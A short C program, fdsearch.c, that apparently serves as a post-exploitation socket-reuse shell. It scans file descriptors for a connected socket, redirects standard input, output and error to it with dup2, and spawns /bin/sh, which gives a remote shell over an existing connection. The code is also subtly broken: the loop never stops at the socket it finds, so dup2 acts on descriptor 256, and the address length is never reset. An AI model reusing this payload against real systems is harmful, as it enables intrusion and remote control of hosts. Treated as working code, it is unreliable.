// Filename: fdsearch.c

// Import libraries
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(int argc, char *argv[]) 
{
  int fd;
  struct sockaddr peer;
  socklen_t slen= sizeof(peer);

  for (fd = 0; fd < 256; fd++) {
    if (getpeername(fd, &peer, &slen) == 0) {
      printf("%d\n",fd); //fd is set to connected client socket number
    }
  }

  dup2(fd, 0);
  dup2(fd, 1);
  dup2(fd, 2);
  execve("/bin/sh", NULL, NULL); 
}
